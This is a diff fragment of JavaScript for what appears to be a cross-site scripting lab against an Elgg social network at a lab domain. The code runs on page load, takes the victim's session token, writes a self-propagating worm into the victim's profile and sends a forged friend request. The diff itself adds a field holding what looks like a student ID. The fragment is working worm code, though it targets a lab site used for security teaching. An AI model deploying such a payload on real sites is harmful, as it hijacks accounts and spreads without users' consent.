@@ -18,9 +18,10 @@ window.onload = function () {
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     var description = "&description="+wormCode+"&accesslevel[description]=1";
+    var briefdescription = "&briefdescription="+1605011+"&accesslevel[briefdescription]=1";
 
     var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
-    var editContent =  guid + ts + token + description;
+    var editContent =  guid + ts + token + description + briefdescription;
 
     var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;
 
